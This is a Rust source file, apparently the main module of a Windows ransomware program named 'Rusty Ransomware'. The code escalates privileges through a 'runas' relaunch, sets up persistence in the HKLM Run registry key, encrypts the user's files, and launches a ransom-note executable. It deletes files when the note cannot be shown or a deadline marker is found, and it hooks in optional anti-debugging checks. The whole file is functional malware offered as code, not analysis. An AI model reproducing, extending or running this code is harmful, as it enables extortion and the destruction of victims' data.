#[cfg(windows)]
extern crate winapi;

mod encryption;
mod antivm;
mod traversing;

use antivm::is_debugger_present;
use winapi::shared::ntdef::LPSTR;
use std::ffi::CString;
use std::ptr::{self, null_mut};
use std::{mem, process};
use traversing::{traverse_and_delete, traverse_and_encrypt};
use winapi::shared::minwindef::HKEY;
use winapi::um::fileapi::{CreateFileA, ReadFile, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::libloaderapi::GetModuleFileNameA;
use winapi::um::processthreadsapi::{
    CreateProcessA, GetCurrentProcess, OpenProcessToken, PROCESS_INFORMATION, STARTUPINFOA,
};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::shellapi::ShellExecuteA;
use winapi::um::winbase::{GetUserNameA, CREATE_DEFAULT_ERROR_MODE, CREATE_NEW_CONSOLE, STARTF_USESHOWWINDOW};
use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
use winapi::um::winnt::{FILE_ATTRIBUTE_NORMAL, FILE_READ_DATA, FILE_SHARE_READ};
use winapi::um::winnt::{HANDLE, KEY_ALL_ACCESS, REG_SZ};
use winapi::um::winreg::{
    RegCloseKey, RegGetValueA, RegOpenKeyExA, RegSetValueExA, HKEY_LOCAL_MACHINE,
};

fn main() {
    // Uncomment this line to use anti-reversing
    // anti_reversing();
    if !is_already_encrypted() {
        if !check_elevation() {
            process::exit(0);
        }

        add_registry_startup();
        traverse_and_encrypt();

        if !display_ransom_note() {
            traverse_and_delete();
        }

        process::exit(0);
    }

    if !display_ransom_note() {
        traverse_and_delete();
    }
}

fn add_registry_startup() -> bool {
    unsafe {
        let mut registry_handle: HKEY = null_mut();

        if RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap().as_ptr(),
            0,
            KEY_ALL_ACCESS,
            &mut registry_handle,
        ) != 0
        {
            RegCloseKey(registry_handle);
            return false;
        }

        let mut reg_type: u32 = 0;
        let mut path: Vec<u8> = Vec::new();
        let mut size: u32 = 200;
        path.resize(200, 0u8);

        if RegGetValueA(
            HKEY_LOCAL_MACHINE,
            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap().as_ptr(),
            CString::new("Rusty Ransomware").unwrap().as_ptr(),
            2,
            &mut reg_type,
            path.as_mut_ptr() as *mut _,
            &mut size,
        ) != 0
        {
            let mut name: Vec<i8> = Vec::new();
            name.resize(200, 0i8);
            let length = GetModuleFileNameA(null_mut(), name.as_mut_ptr() as *mut i8, 200);
            let mut path: Vec<u8> = Vec::new();
            for i in 0..length as usize {
                path.push(name[i] as u8);
            }
            path.push(0u8);
            let length = length + 1;

            if RegSetValueExA(
                registry_handle,
                CString::new("Rusty Ransomware").unwrap().as_ptr(),
                0,
                REG_SZ,
                path.as_ptr(),
                length,
            ) != 0
            {
                RegCloseKey(registry_handle);
                return false;
            } else {
                RegCloseKey(registry_handle);
                return true;
            }
        } else {
            RegCloseKey(registry_handle);
            return false;
        }
    }
}

fn check_elevation() -> bool {
    unsafe {
        let mut module_name: Vec<i8> = vec![0; 200];
        let length = GetModuleFileNameA(null_mut(), module_name.as_mut_ptr(), 200);
        let mut path: Vec<u8> = Vec::new();
        for i in 0..length as usize {
            path.push(module_name[i] as u8);
        }

        if is_user_elevated() {
            return true;
        } else {
            ShellExecuteA(
                null_mut(),
                CString::new("runas").unwrap().as_ptr(),
                CString::from_vec_unchecked(path).as_ptr(),
                null_mut(),
                null_mut(),
                1,
            );
        }
        return false;
    }
}

fn is_user_elevated() -> bool {
    let mut process_token: HANDLE = null_mut();
    let mut token_elevation: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut size: u32 = 0;
    unsafe {
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut process_token);
        GetTokenInformation(
            process_token,
            TokenElevation,
            &mut token_elevation as *mut _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        );
        return token_elevation.TokenIsElevated == 1;
    }
}

fn is_already_encrypted() -> bool {
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    let mut user_name: Vec<u8> = Vec::new();
    unsafe {
        GetUserNameA(null_mut(), &mut size);
        buffer.resize(size as usize, 0i8);

        GetUserNameA(buffer.as_mut_ptr(), &mut size);
        user_name = std::mem::transmute(buffer);
        user_name.resize((size - 1) as usize, 0u8);

        let mut full_path = String::from("C:\\Users\\");
        full_path.push_str(std::str::from_utf8(&user_name[..]).unwrap());
        full_path.push_str("\\encrypt_date.txt");

        let full_path_cstring: CString = CString::new(full_path).unwrap();

        if CreateFileA(
            full_path_cstring.as_ptr(),
            1,
            1,
            null_mut(),
            OPEN_EXISTING,
            0x80,
            null_mut(),
        ) == INVALID_HANDLE_VALUE
        {
            return false;
        }
    }
    true
}

fn display_ransom_note() -> bool {
    let mut size: u32 = 0;
    unsafe {
        GetUserNameA(null_mut(), &mut size);
    }
    let mut buffer: Vec<u8> = vec![0; size as usize];
    unsafe {
        GetUserNameA(buffer.as_mut_ptr() as *mut i8, &mut size);
    }

    let username = String::from_utf8_lossy(&buffer[..(size - 1) as usize]);

    let encrypt_date_path = format!("C:\\Users\\{}\\encrypt_date.txt", username);

    let date_file = unsafe {
        let file_path_cstr = CString::new(encrypt_date_path.clone()).unwrap();
        CreateFileA(
            file_path_cstr.as_ptr(),
            FILE_READ_DATA,
            FILE_SHARE_READ,
            ptr::null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        )
    };

    if date_file == INVALID_HANDLE_VALUE {
        println!("Error: Couldn't open encrypt_date.txt file.");
        return false;
    }

    let mut get_date = [0u8; 2];
    let mut count = 0;
    unsafe {
        ReadFile(
            date_file,
            get_date.as_mut_ptr() as *mut _,
            2,
            &mut count,
            ptr::null_mut(),
        );
        CloseHandle(date_file);
    }
    if get_date == [99, 99] {
        return false;
    }

    let current_exe_path = std::env::current_exe().unwrap_or_else(|_| {
        println!("Error: Couldn't retrieve current executable's path.");
        std::process::exit(1);
    });
    let ransomnote_exe_path = current_exe_path
        .parent()
        .map(|p| p.join("ransomnote.exe"))
        .unwrap_or_else(|| {
            println!("Error: Couldn't construct ransomnote.exe path.");
            std::process::exit(1);
        });

    if !ransomnote_exe_path.exists() {
        println!("Error: ransomnote.exe does not exist.");
        return false;
    }

    let mut start_up_info: winapi::um::processthreadsapi::STARTUPINFOA = unsafe { mem::zeroed() };
    start_up_info.cb = mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOA>() as u32;
    let mut process_info: winapi::um::processthreadsapi::PROCESS_INFORMATION = unsafe { mem::zeroed() };

    let command_line = CString::new(format!("\"{}\" \"{}\"", ransomnote_exe_path.to_string_lossy(), encrypt_date_path)).unwrap();

    let success = unsafe {
        winapi::um::processthreadsapi::CreateProcessA(
            ptr::null(),
            command_line.as_ptr() as *mut i8,
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            winapi::um::winbase::CREATE_NEW_CONSOLE,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut start_up_info,
            &mut process_info,
        )
    };
    
    if success != 0 {
        true
    } else {
        false
    }
}